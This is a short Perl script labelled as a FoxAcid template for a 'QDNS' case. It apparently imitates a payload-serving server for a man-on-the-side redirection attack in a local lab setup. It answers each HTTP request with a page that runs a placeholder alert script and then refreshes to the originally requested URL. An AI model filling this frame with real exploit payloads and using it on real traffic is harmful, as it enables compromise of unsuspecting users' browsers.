#!/usr/bin/perl

# FoxAcid template for QDNS case

use IO::Socket::INET;
use MIME::Base64;
use Term::ANSIColor;

# needs to bind to a local IP, so the QI redirector can
# filter out such connections. This is only necessary in a local LAN
# test setup, as ITW, the QI will probably not see FoxAcid's requests
my $sock = IO::Socket::INET->new(LocalAddr => '192.168.0.253',
                                 LocalPort => 80,
                                 Proto => 'tcp',
                                 ReuseAddr => 1,
                                 Listen => 12) or die $!;

my $req = "";
my $host = "";
my $path = "";

my $redir_base=<<EOR;
HTTP/1.1 200 OK\r
Server: FoxAcid 0.1\r
Content-Type: text/html\r
\r
<html>
<head>
<meta http-equiv="refresh" content="0; URL=http://NOACID">
</head>
<body>
<script>
alert("EGOTISTICAL GIRAFFE!");
</script>
</body>
</html>
EOR


for (;;) {
	$req = "";
	my $peer = $sock->accept();
	$peer->recv($req, 1024);
	next if length($req) == 0;

	print color 'green';
	print "$req\n";

	if ($req =~ /^(GET|POST)\s+([^ ]+)/) {
		$path = $2;
		$req =~ /Host: ([^\r]+)/;
		$host = $1.$path;
		$redir = $redir_base;
		$redir =~ s/NOACID/$host/;
	} else {
		next;
	}

	print $peer $redir;

	print color 'red';
	print "\n$redir\n";

	$peer->close();
}

